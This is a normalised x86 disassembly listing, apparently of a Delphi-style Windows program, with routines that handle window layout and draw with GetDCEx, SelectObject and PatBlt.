mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_412668
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_447fc4
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_447fc4
pop ecx
mov eax ebx
call sub_403290
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_447fc4
pop ecx
sub_447ff8
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_447fc4
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_403290
xor eax eax
mov [ esi + 0x64 ] eax
sub_448054
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_447064
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_448090
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_448090
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_4482fd
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405b10
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405b10
mov edx [ ebp - 0x8 ]
pop eax
call sub_4042a8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
mov eax [ ebx + 0x14 ]
call sub_4467f0
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405b10
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405b10
mov edx [ ebp - 0x10 ]
pop eax
call sub_4042a8
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b490
call sub_403a1c
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_403290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448304
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_404004
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_446ba0
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_446d18
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_446d54
mov eax [ ebx + 0x18 ]
call sub_446ba0
mov [ edx + 0x18 ] eax
push esi
push sub_4488a0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4470cc
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_446d54
mov eax [ esi + 0x64 ]
call sub_446d18
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_403290
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_448878
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
xor edx edx
mov [ eax + 0x8 ] edx
mov eax edi
call sub_403290
mov eax [ esi + 0x64 ]
mov [ eax + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ esi + 0x64 ]
call sub_44689c
mov edx eax
mov eax edi
call sub_446d40
mov eax edi
call sub_446ba0
jmp r-xdata
mov edx [ edi + 0x8 ]
mov [ eax + 0xc ] edx
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
push esi
push sub_4488a0
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_4470cc
jmp r-xdata
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0xc ]
mov [ eax + 0xc ] edx
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
mov edx [ ebx + 0x14 ]
mov edx [ edx + 0x14 ]
mov [ eax + 0x14 ] edx
push esi
push sub_4488a0
mov edx [ eax + 0x14 ]
mov eax esi
call sub_4470cc
mov eax [ ebx + 0x14 ]
call sub_403290
mov eax edi
call sub_403290
jmp r-xdata
mov edx [ eax + 0xc ]
mov [ edx + 0x18 ] eax
sub_44830c
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov esi [ edi + 0x14 ]
test [ esi + 0x1c ] 0x1
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x64 ] 0x0
je r-xdata
mov eax esi
call sub_443498
test eax eax
jle r-xdata
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ edi + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8c ]
test bl bl
jne r-xdata
push edi
lea esi [ esp + 0x4 ]
add edi 0x1d
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ edi + 0x64 ]
mov dl [ eax + 0x10 ]
dec dl
je r-xdata
lea edx [ edi + 0x1d ]
mov eax esp
mov ecx 0x10
call sub_407c70
test al al
jne r-xdata
mov edx [ esp + 0x8 ]
sub edx [ esp ]
call sub_446d40
mov eax [ esp + 0xc ]
sub eax [ esp + 0x4 ]
mov [ edi + 0x68 ] eax
jmp r-xdata
dec dl
je r-xdata
mov eax [ edi + 0x14 ]
call sub_443404
test eax eax
jle r-xdata
mov edx [ esp + 0xc ]
sub edx [ esp + 0x4 ]
call sub_446d40
mov eax [ esp + 0x8 ]
sub eax [ esp ]
mov [ edi + 0x68 ] eax
jmp r-xdata
xor edx edx
mov eax edi
call sub_448728
cmp [ edi + 0x6c ] 0x0
jne r-xdata
push edi
push sub_4488a0
xor edx edx
mov eax edi
call sub_4470cc
sub_4483e8
push ebx
push esi
push ecx
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop edx
pop esi
pop ebx
retn
test ebx ebx
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_446d18
mov [ esp ] eax
fild [ esp ]
fmul [ esi + 0x40 ]
call sub_402a68
mov edx eax
mov eax ebx
call sub_446d40
sub_448424
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_404490
xor eax eax
push ebp
push sub_44848f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_4042a0
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp - 0x8 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448496
lea eax [ ebp - 0x4 ]
call sub_403fe0
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_44849c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_44854b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x1
mov esi [ eax ]
call [ esi + 0x10 ]
lea edx [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_446aa8
mov eax [ ebp - 0x8 ]
call sub_448424
pop ecx
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
inc edx
call sub_44849c
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448552
lea eax [ ebp - 0x8 ]
call sub_403fe0
retn
mov edx [ ebp + 0x8 ]
push edx
mov edx [ ebp - 0x4 ]
call sub_44849c
pop ecx
sub_448558
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_448691
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x70 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_448640
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_443404
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x10 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx [ ebp - 0xc ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448647
mov eax [ ebp - 0x10 ]
call sub_403290
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp [ edi + 0x8 ] 0x0
je r-xdata
push ebp
lea ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0x10 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x14 ]
call sub_448424
pop ecx
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_443418
mov edi eax
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
sub_448647
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
xor edx edx
call sub_44849c
pop ecx
mov edx rw-data
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448698
lea eax [ ebp - 0x14 ]
call sub_403fe0
retn
sub_4486a0
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446df0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446e18
call sub_4486a0
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_446df0
call sub_4486a0
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp ebx [ eax + 0x64 ]
je r-xdata
mov eax ebx
call sub_446820
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x64 ]
mov esi [ ebx + 0x14 ]
cmp eax esi
jne r-xdata
mov eax [ esi + 0x14 ]
call sub_446d18
mov edx eax
mov eax ebx
call sub_446d40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x68 ]
mov eax ebx
call sub_446d40
jmp r-xdata
sub_448728
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
test edx edx
jne r-xdata
push ebp
mov eax edx
call sub_4486a0
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ eax + 0x8 ]
sub_44876c
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
cmp ebx [ esi + 0x64 ]
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
cmp al [ esi + 0x48 ]
jne r-xdata
mov eax ebx
call sub_446d18
mov edx eax
add edx [ esi + 0x4c ]
mov eax ebx
call sub_446d40
sub_44879c
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi ecx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov [ ebx + 0x60 ] edx
mov eax [ ebx + 0x14 ]
call sub_444968
mov edx eax
mov eax [ rw-data ]
call sub_4492fc
mov eax [ ebx + 0x14 ]
call sub_444968
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_4488b0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4487fc
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_4492fc
mov eax ebx
call sub_4488b0
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_446d40
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_446d40
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_448728
push ebx
push sub_4488a0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_4470cc
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_448878
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_443404
test eax eax
jle r-xdata
push ebx
push sub_4488a0
xor edx edx
mov eax ebx
call sub_4470cc
sub_4488b0
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_4468e4
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_4468e4
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_446950
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_446950
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_41cf48
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44899c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44899c
pop ecx
mov eax ebx
call sub_446d18
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446d18
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44899c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_446d18
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_423a30
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_448a2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446d18
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_44689c
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_446d18
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44899c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_448a7c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43daec
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43daec
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_448af8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_4467a8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_446854
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_446dfc
test eax eax
je r-xdata
mov eax esi
call sub_446820
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4488a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_4470cc
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_446dfc
mov edx [ ebx + 0x20 ]
call sub_446d54
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_448af8
pop ecx
sub_448b78
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_446804
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_446804
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_446dfc
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_448b78
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_4488a0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_4470cc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_446a00
mov eax edi
call sub_446df0
test eax eax
je r-xdata
mov eax edi
call sub_446dfc
mov esi eax
mov eax esi
call sub_446d18
push eax
mov eax esi
call sub_446854
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_446df0
call sub_446d18
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_446d18
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_446d40
mov eax esi
call sub_446d18
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_446d40
mov eax edi
call sub_446dfc
call sub_446d90
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_446854
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_446d40
mov eax edi
call sub_446df0
call sub_446d90
mov bl 0x1
jmp r-xdata
sub_448cb0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_447064
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412618
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_447858
test eax eax
je r-xdata
push ebp
call sub_448af8
pop ecx
push ebp
call sub_448b78
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_448a7c
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_448d38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_4468e4
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_4468e4
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_448a2c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_448a2c
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_448dc8
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4491a0
push [ fs : eax ]
mov [ fs : eax ] esp
